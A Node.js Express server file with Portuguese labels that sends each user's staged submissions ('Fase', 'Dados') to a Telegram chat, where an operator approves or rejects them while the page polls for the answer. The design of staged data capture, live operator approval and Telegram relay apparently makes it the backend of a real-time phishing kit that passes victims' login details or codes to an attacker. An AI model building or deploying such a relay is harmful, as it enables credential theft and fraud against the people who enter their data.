const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();

// Parse JSON bodies
app.use(express.json());

// Serve static files from the sibling "Frontend" directory
const FRONTEND_PATH = path.join(__dirname, '..', 'Frontend');
app.use(express.static(FRONTEND_PATH));

// Retrieve environment variables from Render
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const PORT = process.env.PORT || 3000;

// Multi-user state management: Map<sessionId, { status, type, lastData, updatedAt }>
const userSessions = new Map();

// Helper to safely get or initialize a user session
function getOrCreateSession(sessionId) {
    if (!userSessions.has(sessionId)) {
        userSessions.set(sessionId, {
            status: 'idle',
            type: 'none',
            lastData: null,
            updatedAt: Date.now()
        });
    }
    return userSessions.get(sessionId);
}

// -----------------------------------------------------------------
// 1. Submit Data Endpoint
// -----------------------------------------------------------------
app.post('/api/submit', async (req, res) => {
    try {
        const { sessionId, type, content } = req.body;

        if (!sessionId || !type || !content) {
            return res.status(400).json({ success: false, error: 'Missing required fields' });
        }

        // Initialize or update the user's specific session
        const session = getOrCreateSession(sessionId);
        session.status = 'pending';
        session.type = type;
        session.lastData = content;
        session.updatedAt = Date.now();

        // Format the message for Telegram
        const messageText = `👤 *User ID:* ${sessionId}\n\n*Fase:* ${type}\n*Dados:* ${JSON.stringify(content)}`;

        // Send message to Telegram with Inline Action Buttons
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: messageText,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Aprovar", callback_data: `approve_${sessionId}` },
                        { text: "❌ Rejeitar", callback_data: `reject_${sessionId}` }
                    ]
                ]
            }
        });

        return res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error in /api/submit:', error.message);
        // Return 200 to keep the client flow running even if Telegram fails
        return res.status(200).json({ success: false, error: 'Telegram dispatch failed' });
    }
});

// -----------------------------------------------------------------
// 2. Poll Status Endpoint (Specific to sessionId)
// -----------------------------------------------------------------
app.get('/api/poll/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = userSessions.get(sessionId) || { status: 'idle' };
    return res.json(session);
});

// -----------------------------------------------------------------
// 3. Reset Status Endpoint
// -----------------------------------------------------------------
app.post('/api/reset-status/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = userSessions.get(sessionId);
    
    if (session) {
        session.status = 'idle';
        session.updatedAt = Date.now();
    }
    
    return res.sendStatus(200);
});

// -----------------------------------------------------------------
// 4. Telegram Webhook Callback Endpoint
// -----------------------------------------------------------------
app.post('/api/telegram-callback', async (req, res) => {
    try {
        const callbackQuery = req.body.callback_query;
        if (!callbackQuery || !callbackQuery.data) {
            return res.sendStatus(200);
        }

        const [action, sessionId] = callbackQuery.data.split('_');
        const session = userSessions.get(sessionId);

        if (session) {
            session.status = action === 'approve' ? 'approved' : 'rejected';
            session.updatedAt = Date.now();
        }

        // Answer the Telegram callback query to clear the loading status on the button
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: callbackQuery.id,
            text: `Ação processada: ${action}`
        });

    } catch (error) {
        console.error('Error in /api/telegram-callback:', error.message);
    }
    
    return res.sendStatus(200);
});

// -----------------------------------------------------------------
// 5. Root Route (Fallback to serve index.html)
// -----------------------------------------------------------------
app.get('*', (req, res) => {
    res.sendFile(path.join(FRONTEND_PATH, 'index.html'));
});

// Start the server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});